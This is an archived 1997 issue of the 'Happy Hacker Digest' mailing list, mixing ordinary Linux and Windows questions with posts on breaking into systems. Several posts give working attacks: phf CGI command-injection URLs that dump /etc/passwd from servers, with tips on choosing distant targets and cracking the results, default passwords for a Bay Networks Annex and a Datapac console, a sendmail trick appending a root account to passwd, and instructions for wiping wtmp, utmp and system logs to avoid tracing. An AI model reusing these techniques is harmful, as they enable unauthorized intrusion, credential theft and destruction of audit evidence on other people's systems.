@@ -1,0 +1,653 @@
+Happy Hacker Digest March 25-26 1997 
+====================================================================== 
+      This is a moderated list for discussions of *legal* hacking. 
+               Moderators: Carolyn Meinel and Matt Hinze
+                 
+            OR to the Hackers forum: http://www.infowar.com 
+Digest archives are held under the "New" button at the Infowar site
+
+               Please don't send us anything you wouldn't 
+              email to your friendly neighborhood narc, OK?
+
+        To subscribe or 
+unsubscribe, use the subscribe boxes on the menu bars, please.. 
+If you decide you just want to use the forum and not get these 
+mailings, we promise our feelings won't get hurt if you unsubscribe 
+from this list.
+
+                       H a p p y  h a c k i n g !
+
+Table of Contents:
+
+o IRC Anonymity 
+o Bay Network's Annex 
+o Restricting Cookie Access 
+o Datapac 
+o Searching for a disassembler 
+o Cracking Excel Passwords 
+o IE fix a hoax 
+o Linux Question 
+o Linux or FreeBSD? 
+o Changing your browser's logo 
+o /etc/passwd info 
+o phf bug 
+o Hacking port 25 
+o Windows 95 portscanner 
+o Programming Advice 
+o Editing the registry 
+o sendmail 
+o Understanding UNIX 
+o More Windows 95 hacking 
+ 
+
+===================================================================== 
+***   IRC Anonymity 
+=====================================================================
+
+From: " john  smith" <outfield@hotmail.com>
+
+Iw Was in a 'chat forum' the other day, and something i ve never seen 
+before happened. Someone entered the forum with NO I.S.P. numbers or 
+identification?(nothing, not a thing, blank space!)
+
+How the heck did he do this ? Are there site s on the web that will 
+strip away your I.S.P. identification?
+
+If anyone knows how this is done, I would be most grateful if they 
+would share the info.
+
+Thanks in advance. 
+Outfield
+
+outfield@hotmail.com
+
+===================================================================== 
+***  Bay Network's Annex 
+===================================================================== 
+ 
+
+From: anonymous
+
+Anonymous post:
+
+>access..and shadowed passwords. They use an Annex Command Line 
+> Interpreter that, upon login, sometimes drops you out of their 
+> menu (before connecting to the system), and lets you view who 
+>is on the nodes, what jobs are running, and the IP addresses 
+>of servers...
+
+the annex is a remote access product sold by Bay Networks, actually if 
+what you say is true, you should see a prompt like "annex:" or 
+something, try hitting ctrl-A which by default is called an attention 
+key that serves to change from session to session and create several 
+jobs. if you get to the "annex:" prompt, try typing  "su" and the 
+password will be the same IP as the annex, well this only works if 
+they left the default. After that you should see a "annex#" prompt and 
+that means you are in !! you have telnet and other stuff to play with, 
+and actually you could fake your traces, but i'll get into that once 
+you get to enter (i=B4ll mail the details). What's the IP of the annex 
+anyway??
+
+===================================================================== 
+***   Cookies 
+=====================================================================
+
+From: Stigmata <stigmata@geocities.com>
+
+> To stop cookies in netscape, simply change the attributes of the 
+> cookies.txt file to read only.
+
+Or if under linux "ln /dev/null cookies" ;).. It's grandstanding but 
+it's fun..
+
+<signature.removed.as.it.was.longer.than.my.post>.
+
+===================================================================== 
+***   Datapac 
+=====================================================================
+
+From: Fred <fredr@sympatico.ca>
+
+Hey,
+
+    Regarding the discussion on x25 networks, you might wanna try the 
+prefix or DNIC(Data Network Identifier Code) 3020 which is for 
+Canada's Datapac. 
+    An interesting one used to be 302085701427 which accepts reverse 
+charge and is a Gandalf Xmux console for the NRC(National Research 
+Console) with the obvious password of NRC. It is to low access 
+password which will let you look without being able to modify 
+anything. 
+    It should still work. I haven't been on any x25 network in ages 
+but it had been working for many years.
+
+===================================================================== 
+***   Searching for a disassembler 
+=====================================================================
+
+From: "Nabeel Jafferali" <nabeelj@emirates.net.ae>
+
+Hi, I'm looking for a dis-assembler. I've heard of something called 
+Soft-Ice. Where can I get it?
+
+Nabeel
+
+===================================================================== 
+***   Cracking Excel Passwords 
+=====================================================================
+
+From: "Crazy J" <crazyj@earthlink.net>
+
+>hi happy hackers,
+
+>I have a question , has any one every used `Claymore` to attack a 
+>word Xcel password?. If so them please email me, and give some info on how 
+>to set it up.
+
+In regards to the second half of the post in regards to using 
+claymore to recover the password for and excel file. Anyway Im really 
+not sure about how or if you could do it with claymore but I have seen 
+a program that supposebly will recover a password from and excel file 
+you can find it at "http://www.hiwaay.net/bokler/bsw_crak.html" even 
+so I think it is expensive shareware. A cheaper alternative is if you 
+have access to a compiler you could write your own brute force type 
+program. The following is a not so pretty example of one, I wrote real 
+quick after reading the post. It is in Visual Basic, it works, and it 
+is pretty fast but their is not a real good method to stop it as of 
+yet after it gets the password. The last two lines of the do loop will 
+do the job most of the time but it has failed a couple of times. 
+Anyway you need to create one form with two command buttons on it, and 
+the rest should be obvious. Be for you run it you need to open excel 
+or it won't work. 
+  
+Private Sub Command1_Click() 
+    On Error GoTo OOOPS 
+    Dim SendWord 
+    Open "c:\msoffice\excel\wordlist.txt" For Input As #1 'Open Word 
+List 
+    Do While Not EOF(1) 
+        Line Input #1, SendWord 
+        AppActivate "Microsoft Excel" 'make excel the active window 
+        SendKeys "%F" & "O", True 'Do File Open In Excel 
+        SendKeys "book1.xls", True 'Name Of The File We Want To Get 
+Into 
+        SendKeys "{ENTER}", True 'Open File 
+        SendKeys SendWord, True 'Send Next Word To Pass Word Box To 
+Try 
+        SendKeys "{ENTER}", True 'Try It 
+        'The following lines will have no effect unless we got the 
+        'right ppassword and the spread sheet is open. 
+        SendKeys "%F" & "A", True 'Open Save As 
+        SendKeys "%O", True 'Open Options In Save As 
+        SendKeys "{DEL}", True 'Delete The Password 
+        SendKeys "{ENTER}", True 'Close Options 
+        NewName = Left(SendWord, 8) 'take first 8 letters of pasword 
+and assign to variable 
+        SendKeys NewName, True 'name new file using variable 
+        SendKeys "{ENTER}", True 'Save File 
+        DoEvents 'Give Excel Time To Save 
+        'The next two lines will usually cause and error in the next 
+iteration of the loop that 
+        'with our error handler will stop execution of the program 
+        SendKeys "%T" & "O", True 'Will usually cause error in this 
+program 
+to halt it 
+        SendKeys "{ENTER}", True 'Close Options Dialog Box Opened In 
+Last 
+Line 
+    Loop 
+OOOPS: 
+    Close #1 'Close file 
+End Sub
+
+Private Sub Command2_Click() 
+    End 
+End Sub
+
+Later, 
+Crazy J 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+FEAR - http://www.win.net/~cjc/fear/fear.html 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+===================================================================== 
+*** IE fix a hoak 
+=====================================================================
+
+[ Matt: the following was fowarded from the BUGTRAQ mailing list; to 
+subscribe to BUGTRAQ, write to LISTSERV@NETSPACE.ORG and, in the  text 
+of your message (not the subject line), write: SUBSCRIBE BUGTRAQ ] 
+ 
+
+>Sender: Bugtraq List <BUGTRAQ@NETSPACE.ORG> 
+>From: Aaron Spangler <pokee@MAXWELL.EE.WASHINGTON.EDU> 
+>To: BUGTRAQ@NETSPACE.ORG
+
+>The Latest Internet Explorer Security Patch from Microsoft is a HOAX. 
+> 
+>I just installed the latest Internet Explorer Released by Microsoft Today 
+>(IE 3.02 - Mar25).  It seems it is still COMPLETELY vulnerable to Bugs 
+>#4,#5 released earlier in the month even though it claims to fix them!!! 
+> 
+>Is Microsoft lying when they say it fixes the latest bugs? 
+> 
+>Try it our yourself.  Download IE 3.02 from MS, and 
+>try it on one of the sites 
+> 
+> #4 http://www.ee.washington.edu/computing/iebug/  (For NT only) 
+> #5 http://www.efsl.com/security/ntie/             (For NT only) 
+> 
+>I have not even check bug #6 for win95, but it still may be vulnerable. 
+> #6  http://www.security.org.il/msnetbreak/  (bug#6 for Win95) 
+> 
+> - Aaron 
+> 
+>-- 
+>Aaron Spangler                 EE Unix System Administrator 
+>Electrical Engineering FT-10        pokee@ee.washington.edu 
+>University of Washington            Phone    (206) 543-8984 
+>Box 352500                             or    (206) 543-2523 
+>Seattle, WA 98195-2500              Fax      (206) 543-3842
+
+===================================================================== 
+*** Linux Question 
+===================================================================== 
+ 
+
+From: Sebastien Metrot <smetrot@planetepc.fr>
+
+>    I have currently installed Slackware Linux at the office.  The 
+>    installation went out fine but the problem I encountered was 
+>    how am I going to connect to the internet and also to our LAN? 
+>    I have used netconfig and IMHO, I was able to input the 
+>    correct values.  Still if I try to ping our DNS, Linux says 
+>    that the network is not reachable or something to that effect. 
+>    I am using Ethernet 3Com 509 and I have another box using 
+>    NE2000.  What should I do?  I've skimmed through Linux 
+>    Unleashed and it assumes that we are connected properly.  I 
+>    tried GNU Linux too but the same thing happens. Please help. 
+>    Thanks in advance! :) 
+>
+
+It's just that linux doesn't recognise your network card... 
+Your problem is that the 3COM 3c509 card is a Plug and play device and 
+linux doesn't care about most pnp devices. What you have to do is 
+disable the pnp feature of this card from the dos configuration 
+program on the 3com disk set, and assign it good port,irq & memory 
+address. After that, linux should recognize it very well... Hum, may 
+be you'll have to recompile your kernel with new setting in the 
+network part... (i don't remember)...
+
+  mailto:smetrot@planetepc.fr 
+ 
+
+===================================================================== 
+*** Linux or FreeBSD? 
+===================================================================== 
+ 
+
+>From: "Otter" <otter@starnetinc.com>
+
+Hi, 
+ You have some nice stuff with the GTmHH.  I have a qucik 
+question. Linux or FeeBSD?  I have BSD right now (not running though) 
+and was wondering which is a better environment, and which has better 
+software support for some thInGs?  Thanks a lot.
+
+otter 
+otter@starnetinc.com
+
+[ Matt: It depends on who you ask. Some would recommend FreeBSD, some 
+Linux. It is my opinion is that Linux offers a more diverse 
+hard/software support, and I would go with that. ]
+
+===================================================================== 
+*** Changing the Logo 
+=====================================================================
+
+From: Matthew DeMizio <matthewd@pipeline.com>
+
+>I was wondering if anybody knows a way to change the animated logo (top 
+>left corner) of Netscape and IE browsers.  I know it's possible because AT&T 
+>and Quicken and other companies did that, well at least to the Netscape 
+>browser. 
+>So if somebody figures how to do it please post it on this list.
+
+I'm not exactly sure how to do it in Netscape but I believe in IE you 
+can do it with the "Internet Explorer Administration Kit" from 
+Microsoft. It's made for ISP's and companies that want to customize 
+their version of IE. You can get it from Microsoft's web page 
+somewhere, but you have to provide information about your company to 
+download it.
+
+Now, if there's another way to do it w/o the Admin Kit, I'd really 
+like to know.
+
+Hope this helps.
+
+-md
+
+-- 
+Matthew DeMizio - - matthewd@pipeline.com 
+Home Page: http://users.aol.com/ltdemiz/ 
+DeMizio Computer Services: http://users.aol.com/ltdemiz/dcs/ 
+ 
+
+===================================================================== 
+*** /etc/passwd info 
+=====================================================================
+
+From: anonymous
+
+Please make this anonymous
+
+A question about password files:
+
+ In many password files, everything is shadowed. However in 
+some, the passwords aren't. Except for the accounts like adm, sys, and 
+bin. I can understand this; a hacker could do anything with these 
+accounts. However, root isn't shadowed. Why is this? It's beem like 
+this in every unshadowed password file I've seen (which isn't a lot, 
+but I'm definately seeing a trend). It doesn't make much sense. 
+ Is there any way to see if a password file that you have is 
+correct and up to date besides simply logging on with it. This is 
+obviously ILLEGAL, and the host can tell where you're calling from. 
+People have posted that there are ways to do this anonymously, but 
+nobody's posted what they are. 
+ One last thing: Can somebody please post what the parts of the 
+pw file are or give me a url where I can find it? Thanks.
+
+===================================================================== 
+*** phf bug 
+===================================================================== 
+ 
+
+From: ae630@pgfn.bc.ca (Tim Gutteridge) 
+ 
+
+What are some of the other commands that you can do through the 
+phf bug? Can you do any command anywhere in UNIX? And can you get the 
+shadow file from a host in the same way as you can get the shadowed 
+password file (by replacing the passwd at the end with shadow)? It 
+hasn't worked for me, but I can't see why. Maybe the hosts I've tried 
+have used different directories.
+
+For some reason, you can't use this bug through anonymizer. Does 
+anybody know of any anonymous web surfers that let you? You would be 
+able to do almost anything on a computer, while normally the computer 
+can see where the password is being sent to. This seems dangerous.
+
+A good way to find sites to try this bug on is to use yahoo. 
+Search for something like http://www.au, and you will get a listing of 
+url's near the other end of the earth, where it is safest to do this 
+sort of thing. Once you get a password file that isn't shadowed, the 
+best cracker to use is John the Ripper. You can download it and some 
+wordlists from Silicon Toad's web site.
+
+Feel free to e-mail me if you have any questions on this type of 
+thing or just want to share ideas and discuss what you're doing with 
+this.
+
+-- 
+_____    _____ 
+  |      |   __ 
+  |IM    |____|UTTERIDGE ae630@freenet.unbc.edu
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- 
+ 
+
+From: John Beal <jalexfox@www.cococreations.com>
+
+In response to the post about the PHF hack :
+
+>Anonymous post: 
+> 
+>Hi Carolyn, 
+>           Recently there has been quite a discussion on the PHF script 
+>that gets you the passwd file on servers that use this script. The passwd 
+>file is not the only reward, this flaw can be used to do almost anything on 
+>a server (even get root). 
+>I have played around a lot with this bug and I am amazed at the laxity and 
+>negligence of the sysop. However getting to the point. 
+>This is what the exploit looks like: 
+>http://"name of server"/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
+>Now, if one were to simply replace the 'cat' command with another command 
+>(use your imagination) then he/she can accomplish a lot. 
+>Simply remember that %20 signifies a space. 
+>I really love this bug because just about anyone who knows a little about 
+>Unix can make it bigtime with this bug. 
+>Bye
+
+Here is a quick down and dirty method for getting a look at what is 
+listed in the host target's puter ; 
+http://"name of server"/cgi-bin/phf?Qalias=x%0a/bin/ls%20/ 
+The above Phf will give you the a dir listing of everything from the 
+root of the system from there you can just alter it accordingly to 
+have a peek around the system to see what else you can learn :) IE; 
+http://"name of server"/cgi-bin/phf?Qalias=x%0a/bin/ls%20/bin 
+would show you every command that is available in the bin dir and if 
+you slightly modified it you would also be able to see the permissions 
+of the specific files IE; 
+http://"name of server"/cgi-bin/phf?Qalias=x%0a/bin/ls%20-la%20/bin 
+which can come in handy since, Well seen as how you have root 
+permissions you now have a nice little bit of info about how the 
+system functions and can use that to get even more access or info out 
+of it. Bottom Line if you run a server Ditch the PHF hack or do what 
+alot of others have done and put a symbolic link or small script that 
+points people to the www.apache.org Phf Candid Camera Screen You've 
+Been Busted 
+:-) 
+So remember boys and girls play fair and hack to learn, hack to earn, 
+yearn to hack, just dont crack when you hack and you will have plenty 
+of fun and never have to meet Bruno or Betty in the Pen.
+
+Happy Hacking
+
+Jalexfox
+
+===================================================================== 
+*** Hacking port 25 
+=====================================================================
+
+From: anonymous
+
+Please make anonymous! 
+I was wondering if you know the correct commands to enter once you 
+connect to the incoming mail port? anything that I type says error!!!! 
+Also is there a way to get my mail from the server through a certain 
+port, if so what are the commands? Thanks!
+
+[ Matt: try the command 'help'. If that doesn't work, there's not much 
+you can do. ]
+
+===================================================================== 
+*** Windows 95 portscanner 
+===================================================================== 
+ 
+
+From: " NoOne  Uno" <mxlplx@hotmail.com>
+
+Hi!  I just wanted to let your readers know that I found a great port 
+scanner for Windows 95. The PortScanner can be found at 
+http://www.blueglobe.com/~cliffmcc/portscanner.html.  It allows you to 
+scan a range of IP addresses and pick which 
+ports to test(you can add your own.) A listing of which ports are 
+accessible is listed when finished.  The only annoying part of the 
+program is the "REGISTER ME" windows that pop-up all the time.  This 
+could be remedied by registering or... well thats all!  Enjoy! 
+  
+                               mxlplx
+
+===================================================================== 
+*** Programming Advice 
+=====================================================================
+
+From: anonymouszzzz@hotmail.com
+
+I am pretty new to hacking and I was wondering if you could 
+answer a question for me: I am learning BASIC but what Programming 
+language is the best to learn for hacking? 
+  -PsyBeRsiDe
+
+[Matt: C++]
+
+===================================================================== 
+***   Editing the Registry 
+=====================================================================
+
+From: "BeAvEr" <beaver11@themall.net>
+
+I have a question.  I ws just exploring the Registry Editor to my 
+wonderful Windows95, when I stumbled into something.  In the 
+"HKEY_LOCAL_MACHINE" under the System folder, I found a folder called 
+"PwdProvider"  Is this folder in every computer.  Because certain 
+files in that folder contained encypted information about my various 
+passwords to my computer.  Would it be possible for someone that 
+already has access to my computer to get my various passwords?  And 
+then change them?  Also, is there anyway to place a ..wav file in your 
+Windows Startup Screen.  So when you boot up Windows a ..wav file will 
+play with it?  I would like to thank the GTMHH Beginner issues a lot. 
+It is a place for beginners to start, we all should appeciate it.  It 
+is something the more experienced hackers never had.
+
+Thank you GTMHH!  Ha.
+
+BeAvEr 
+"Novices will soon be Pros"
+
+===================================================================== 
+*** sendmail 
+=====================================================================
+
+From: Claude Scarpelli <claude@INFOBIOGEN.FR>
+
+> > > Hello fellow mongoloids 
+> > > Try this: 
+> > > Make hard link of /etc/passwd to /var/tmp/dead.letter 
+> > > Telnet to port 25, send mail from some bad email address to some 
+> > > unreacheable hoost. 
+> > > Watch your message get appended to passwd. 
+> > > ie: 
+> > > cowzilla::0:0:c0wz1ll4 0wns u:/:/bin/sh 
+> 
+> okay, just want to point out some things about this exploit... 
+> this won't work on big boxes that are partitioned cause you can only do a 
+> hard link on the same file system.  another point is that any box that has 
+> a 'MAILER-DAEMON' defined will get any mail that gets sent there instead= 
+ of it
+
+Sometimes, sendmail can't send mail to MAILER-DAEMON. In these case, 
+the message is stored in /var/tmp/dead.letter.
+
+I have seen it appear in the following configuration :
+
+1) sendmail on the best MX host is configured to refuse mail bigger 
+   than x bytes.
+
+2) sendmail on a lower priority MX host is configured as a null client 
+   (FEATURE(nullclient)), but without the size limit.
+
+3) a big mail (bigger than x bytes) arrives on the host where sendmail 
+   is configured as a null client (the low priority MX host).
+
+Here is what happens then:
+
+4) the null client tries to pass the mail to the best MX, which refuse 
+   it (bigger than x bytes)
+
+5) So the null client tries to bounce back the mail to the 
+   originator. Since  it is a null client, it sends the mail to the 
+   best MX host.
+
+6) But the best MX host refuses the mail (bigger than x bytes). So the 
+   null client tries to send a notification to MAILER-DAEMON. Since it 
+   is a null client, it sends this mail to the best MX host, which 
+   refuse it (bigger than x bytes). This a case where sendmail will 
+   write to /var/tmp/dead.letter.
+
+It may exist other ways for sendmail to write in /var/tmp/dead.letter. 
+ 
+
+-- 
+----------------------------------------------------------------------------= 
+-- 
+Claude Scarpelli                        | Defenestrate: to exit a 
+window 
+INFOBIOGEN ::=3D INFOrmatique appliqu=E9e =E0 | onscreen. (Time= 
+ International 
+l'=E9tude des BIOmol=E9cules et des G=C9Nomes | Vol 146, No. 20, Nov 
+13,= 
+ 1995) 
+ 
+
+===================================================================== 
+*** Understanding UNIX 
+===================================================================== 
+ 
+
+From: Peter Beckman <beckman@nova.org>
+
+> Yhanls VERY MUCH for advice.
+
+ If that means thanks, then  you are welcome!
+
+> However, three clarificarions (on my obscurely sey questions). 
+> How to END session ? (I mean how to QUIT. from server? 
+> Is the command "quit " enough ?
+
+ quit, logout, exit.  They should all work.  As long as it says you 
+ are disconnected, then that's all you need to do.
+
+> Secondly, I don't know how to Telnet from another computer using my 
+> server amd without leaaving a loggin trace in mine
+
+Is the system you are using a unix system?  if so, you wil have to 
+gain root.  then find a program that removes a user from the 'wtmp' 
+and 'utmp' logs.  Then go to either /var/logs or /var/messages or 
+/var/spool/logs or something like that (varies from unix system to 
+system), and do a grep in those files for your username, and remove 
+all entries that refer to you.
+
+This should allow you to be untracable from your end.  As for the 
+other end, you would have to gain root there and do the same.  Just 
+remember, you need to do a LOT of research and sniffing around a 
+system to find exploits, and you have to do it in a way so you don't 
+raise any flags with the sysadmin (like trying to brute force the root 
+password -- stupid).
+
+> Thirdly, by how I get the file, I meant how to get it from the other 
+> server it has been e-mailed to (by me). Since my address will be 
+> false, wjere will it be sent??
+
+ Tis best to have an anon remailer send it to you.  If you can only 
+ get the file by e-mail..  Best way to hack is use a place/computer 
+ that MANY people have access to (like a library computer), and use a 
+ false name if you have to sign in for it.  That way only the 
+ librarian can identify you.  Otherwise you have left a digital trail 
+ leading back to your machine or ISP.
+
+Peter
+
+===================================================================== 
+*** More Windows 95 Hacking 
+=====================================================================
+
+From: anonymous
+
+anon. post: 
+Is there a way to eliminate the password box that comes on 
+when I turn on the computer using the commands in Beginner's Series 2 
+Section 2, for a computer with Windows 95 installed from CD.  Would 
+that be the password caching command?  It is really easy with Windows 
+95 installed from disk.  Just deleted *.pwl from Windows.  But this 
+doesn't work from CD.  I am the only person with physical access to my 
+computer, and I don't like waiting two minutes to cancel out password, 
+when I could be getting coffee. 
+ 
+
+----------------------------------------------------------------------------- 
+Matt Hinze        <matt@cs.utexas.edu>    <- finger for phish tapelist 
+When they took the fourth amendment, I was quiet because I didn't deal drugs. 
+When they took the sixth amendment, I was quiet because I was innocent. 
+When they took the second amendment, I was quiet because I didn't own a gun. 
+Now they've taken the first amendment, and I can say nothing about it.
